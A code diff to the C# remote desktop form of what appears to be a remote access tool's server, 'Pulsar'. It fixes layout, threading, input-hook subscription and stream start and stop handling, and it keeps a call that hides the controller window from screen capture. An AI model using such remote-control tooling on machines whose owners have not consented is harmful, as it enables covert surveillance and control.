@@ -14,6 +14,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
@@ -145,9 +146,17 @@ namespace Pulsar.Server.Forms
                 throw;
             }
 
+            // Ensure correct docking so picDesktop never draws behind panels:
+            // panelTop and panelDrawingTools dock top, picDesktop fills remaining area.
+            panelTop.Dock = DockStyle.Top;
+            panelDrawingTools.Dock = DockStyle.Top;
+            picDesktop.Dock = DockStyle.Fill;
+
+            // Apply dark mode and screen capture protection
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
+            // Configure color picker and drawing buttons
             colorPicker.BackColor = _drawingColor;
             colorPicker.FlatStyle = FlatStyle.Flat;
             colorPicker.FlatAppearance.BorderColor = Color.White;
@@ -164,6 +173,9 @@ namespace Pulsar.Server.Forms
 
             // Update tooltip text for bidirectional clipboard
             toolTipButtons.SetToolTip(this.btnBiDirectionalClipboard, "Enable bidirectional clipboard sync");
+
+            // Hook resize to keep layout correct
+            this.Resize += FrmRemoteDesktop_Resize;
         }
 
         /// <summary>
@@ -212,11 +224,22 @@ namespace Pulsar.Server.Forms
         /// <param name="connected">True if the client connected, false if disconnected</param>
         private void ClientDisconnected(Client client, bool connected)
         {
-            if (!connected)
+            if (connected) return;
+
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            try
             {
-                this.Invoke((MethodInvoker)this.Close);
+                BeginInvoke((MethodInvoker)(() =>
+                {
+                    if (!IsDisposed)
+                        Close();
+                }));
             }
+            catch (ObjectDisposedException) { }
         }
+
 
         /// <summary>
         /// Registers the remote desktop message handler for client communication.
@@ -239,87 +262,189 @@ namespace Pulsar.Server.Forms
             _remoteDesktopHandler.ProgressChanged -= UpdateImage;
             _connectClient.ClientState -= ClientDisconnected;
         }
+        private bool _inputHooksAttached;
 
-        /// <summary>
-        /// Subscribes to local mouse and keyboard events for remote desktop input.
-        /// </summary>
         private void SubscribeEvents()
         {
-            _keyboardHook = Hook.GlobalEvents();
-            _keyboardHook.KeyDown += OnKeyDown;
-            _keyboardHook.KeyUp += OnKeyUp;
+            if (_inputHooksAttached)
+                return;
 
-            _mouseHook = Hook.AppEvents();
-            _mouseHook.MouseWheel += OnMouseWheelMove;
+            try
+            {
+                _keyboardHook = Hook.GlobalEvents();
+                _keyboardHook.KeyDown += OnKeyDown;
+                _keyboardHook.KeyUp += OnKeyUp;
+
+                _mouseHook = Hook.AppEvents();
+                _mouseHook.MouseWheel += OnMouseWheelMove;
+
+                _inputHooksAttached = true;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"SubscribeEvents failed: {ex}");
+                _inputHooksAttached = false;
+            }
         }
 
-        /// <summary>
-        /// Unsubscribes from local mouse and keyboard events.
-        /// </summary>
         private void UnsubscribeEvents()
         {
-            if (_keyboardHook != null)
+            if (!_inputHooksAttached)
+                return;
+
+            try
             {
-                _keyboardHook.KeyDown -= OnKeyDown;
-                _keyboardHook.KeyUp -= OnKeyUp;
-                _keyboardHook.Dispose();
+                if (_keyboardHook != null)
+                {
+                    _keyboardHook.KeyDown -= OnKeyDown;
+                    _keyboardHook.KeyUp -= OnKeyUp;
+                    _keyboardHook.Dispose();
+                    _keyboardHook = null;
+                }
+
+                if (_mouseHook != null)
+                {
+                    _mouseHook.MouseWheel -= OnMouseWheelMove;
+                    _mouseHook.Dispose();
+                    _mouseHook = null;
+                }
             }
-            if (_mouseHook != null)
+            catch (Exception ex)
             {
-                _mouseHook.MouseWheel -= OnMouseWheelMove;
-                _mouseHook.Dispose();
+                Debug.WriteLine($"UnsubscribeEvents failed: {ex}");
+            }
+            finally
+            {
+                _inputHooksAttached = false;
             }
         }
 
-        /// <summary>
-        /// Starts the remote desktop stream and begin to receive desktop frames.
-        /// </summary>
+
+        // =========================
+        //  START STREAM (FIXED)
+        // =========================
         private void StartStream(bool useGpu)
         {
+            // --- UI state ---
+            btnStart.Enabled = false;
+            btnStop.Enabled = true;
             ToggleConfigurationControls(true);
 
+            // --- Ensure only one image handler ---
+            _remoteDesktopHandler.ProgressChanged -= UpdateImage;
+            _remoteDesktopHandler.ProgressChanged += UpdateImage;
+
+            // --- FPS EVENT FIX (always reattach before Start) ---
+            try { picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated); } catch { }
+            try
+            {
+                picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
+                Debug.WriteLine("FPS event attached (initial).");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Failed to attach FPS event: {ex}");
+            }
+
+            // --- Reset counters ---
+            _sizeFrames = 0;
+            _previousMousePosition = Point.Empty;
+
+            // --- Start rendering control ---
             picDesktop.Start();
-            // Subscribe to the new frame counter.
-            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
+            picDesktop.Enabled = true;
 
-            this.ActiveControl = picDesktop;
+            // --- Tell client to begin streaming frames ---
+            try
+            {
+                _remoteDesktopHandler.BeginReceiveFrames(
+                    barQuality.Value,
+                    cbMonitors.SelectedIndex,
+                    useGpu);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"BeginReceiveFrames failed: {ex}");
+                throw; // handled in btnStart_Click
+            }
 
-            _remoteDesktopHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGpu);
+            // --- SAFETY: some GPUs / first-frame delays detach events ---
+            Task.Delay(150).ContinueWith(_ =>
+            {
+                if (IsDisposed || !IsHandleCreated) return;
 
+                try
+                {
+                    BeginInvoke(new MethodInvoker(() =>
+                    {
+                        try { picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated); } catch { }
+                        try
+                        {
+                            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
+                            Debug.WriteLine("FPS event attached (delayed).");
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Delayed FPS reattach failed: {ex}");
+                        }
+                    }));
+                }
+                catch { }
+            });
+
+            // Enable drawing toolbar button
             btnShowDrawingTools.Enabled = true;
         }
 
-        /// <summary>
-        /// Stops the remote desktop stream.
-        /// </summary>
+
+
+        // =========================
+        //  STOP STREAM (FIXED)
+        // =========================
         private void StopStream()
         {
-            ToggleConfigurationControls(false);
-
-            picDesktop.Stop();
-            // Unsubscribe from the frame counter. It will be re-created when starting again.
-            picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
-
-            this.ActiveControl = picDesktop;
-
-            _remoteDesktopHandler.EndReceiveFrames();
-
-            btnShowDrawingTools.Enabled = false;
-
-            if (panelDrawingTools.Visible)
+            try
             {
-                panelDrawingTools.Visible = false;
-                btnShowDrawingTools.Image = Properties.Resources.arrow_up;
-                toolTipButtons.SetToolTip(btnShowDrawingTools, "Show drawing tools");
+                ToggleConfigurationControls(false);
+                btnShowDrawingTools.Enabled = false;
+
+                UnsubscribeEvents();
+
+                _remoteDesktopHandler.ProgressChanged -= UpdateImage;
+
+                picDesktop.Stop();
+                picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
+                picDesktop.UpdateImage(null, true);
+
+                _enableDrawingMode = false;
+                _enableEraserMode = false;
+                _previousMousePosition = Point.Empty;
+
+                ConfigureDrawingButtons();
+                picDesktop.Cursor = Cursors.Default;
+
+                if (panelDrawingTools.Visible)
+                {
+                    panelDrawingTools.Visible = false;
+                    btnShowDrawingTools.Image = Properties.Resources.arrow_up;
+                    toolTipButtons.SetToolTip(btnShowDrawingTools, "Show drawing tools");
+                }
+
+                _remoteDesktopHandler.EndReceiveFrames();
             }
-
-            _enableDrawingMode = false;
-            _enableEraserMode = false;
-
-            ConfigureDrawingButtons();
-
-            picDesktop.Cursor = Cursors.Default;
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"StopStream error: {ex}");
+            }
+            finally
+            {
+                btnStart.Enabled = true;
+                btnStop.Enabled = false;
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+            }
         }
+
 
         /// <summary>
         /// Toggles the activatability of configuration controls in the status/configuration panel.
@@ -341,6 +466,10 @@ namespace Pulsar.Server.Forms
         {
             panelTop.Visible = visible;
             btnShow.Visible = !visible;
+
+            // Ensure panels are on top and layout is recalculated so picDesktop fills only the remaining area
+            UpdateDesktopLayout();
+
             this.ActiveControl = picDesktop;
         }
 
@@ -351,14 +480,42 @@ namespace Pulsar.Server.Forms
         /// <param name="displays">The currently available displays.</param>
         private void DisplaysChanged(object sender, int displays)
         {
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            if (InvokeRequired)
+            {
+                try
+                {
+                    BeginInvoke(new Action<object, int>(DisplaysChanged), sender, displays);
+                }
+                catch (ObjectDisposedException) { }
+                return;
+            }
+
             cbMonitors.Items.Clear();
             for (int i = 0; i < displays; i++)
                 cbMonitors.Items.Add($"Display {i + 1}");
-            cbMonitors.SelectedIndex = 0;
+            if (cbMonitors.Items.Count > 0)
+                cbMonitors.SelectedIndex = 0;
         }
+
 
         private void UpdateImage(object sender, Bitmap bmp)
         {
+            if (IsDisposed || !IsHandleCreated)
+                return;
+
+            if (InvokeRequired)
+            {
+                try
+                {
+                    BeginInvoke(new Action<object, Bitmap>(UpdateImage), sender, bmp);
+                }
+                catch (ObjectDisposedException) { }
+                return;
+            }
+
             _sizeFrames++;
             if (_sizeFrames >= 60)
             {
@@ -367,14 +524,11 @@ namespace Pulsar.Server.Forms
                 double avg = _remoteDesktopHandler.AverageFrameSizeBytes;
                 if (last > 0 || avg > 0)
                 {
-                    double lastKB = last / 1024.0;
                     double avgKB = avg / 1024.0;
-                    this.Invoke((MethodInvoker)delegate
-                    {
-                        sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
-                    });
+                    sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
                 }
             }
+
             picDesktop.UpdateImage(bmp, false);
         }
 
@@ -392,6 +546,9 @@ namespace Pulsar.Server.Forms
             _enableEraserMode = false;
 
             ConfigureDrawingButtons();
+
+            // Important: ensure initial layout is correct so picDesktop isn't behind panels
+            UpdateDesktopLayout();
 
             _remoteDesktopHandler.RefreshDisplays();
         }
@@ -423,13 +580,51 @@ namespace Pulsar.Server.Forms
             if (WindowState == FormWindowState.Minimized)
                 return;
 
+            // Update the layout first so picDesktop.ClientSize is correct
+            UpdateDesktopLayout();
+
+            // then update remote handler
             _remoteDesktopHandler.LocalResolution = picDesktop.ClientSize;
+
+            // reposition the show button
             btnShow.Left = (this.Width - btnShow.Width) / 2;
             btnShow.Top = this.Height - btnShow.Height - 40;
         }
 
+        /// <summary>
+        /// Centralized layout update that ensures picDesktop fills only the visible client area
+        /// and the top panels are on top (not overlapped by picDesktop).
+        /// Call this after showing/hiding panels or on resize.
+        /// </summary>
+        private void UpdateDesktopLayout()
+        {
+            // Reset docking first to avoid layout conflicts
+            picDesktop.Dock = DockStyle.None;
+
+            // Start from top of the form
+            int yOffset = 0;
+
+            // Add offset for visible panels
+            if (panelTop.Visible)
+                yOffset += panelTop.Height;
+
+            if (panelDrawingTools.Visible)
+                yOffset += panelDrawingTools.Height;
+
+            // Set position and size so picDesktop starts below panels
+            picDesktop.Location = new Point(0, yOffset);
+            picDesktop.Size = new Size(ClientSize.Width, ClientSize.Height - yOffset);
+
+            // Redock to fill the space after manual sizing (forces proper layout)
+            picDesktop.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
+
+            picDesktop.Invalidate();
+        }
+
         private void btnStart_Click(object sender, EventArgs e)
         {
+            picDesktop.Enabled = true;
+
             if (cbMonitors.Items.Count == 0)
             {
                 MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
@@ -437,15 +632,26 @@ namespace Pulsar.Server.Forms
                 return;
             }
 
-            SubscribeEvents();
-            StartStream(_useGPU);
+            try
+            {
+                SubscribeEvents();
+                StartStream(_useGPU);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"StartStream error: {ex}");
+                MessageBox.Show($"Failed to start Remote Desktop.\n\n{ex.Message}",
+                    "Remote Desktop Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                StopStream(); // cleanup
+            }
         }
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            UnsubscribeEvents();
+            picDesktop.Enabled = false;
             StopStream();
         }
+
 
         #region Remote Desktop Input
 
@@ -739,6 +945,10 @@ namespace Pulsar.Server.Forms
                 Properties.Resources.arrow_up;
             toolTipButtons.SetToolTip(btnShowDrawingTools,
                 visible ? "Hide drawing tools" : "Show drawing tools");
+
+            // Recalculate layout so picDesktop fills remaining area and panels stay on top
+            UpdateDesktopLayout();
+
             this.ActiveControl = picDesktop;
         }
 
@@ -895,6 +1105,16 @@ namespace Pulsar.Server.Forms
             {
                 Debug.WriteLine($"Failed to update client clipboard sync state: {ex.Message}");
             }
+        }
+
+        private void panelTop_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void panelDrawingTools_Paint(object sender, PaintEventArgs e)
+        {
+
         }
     }
 }
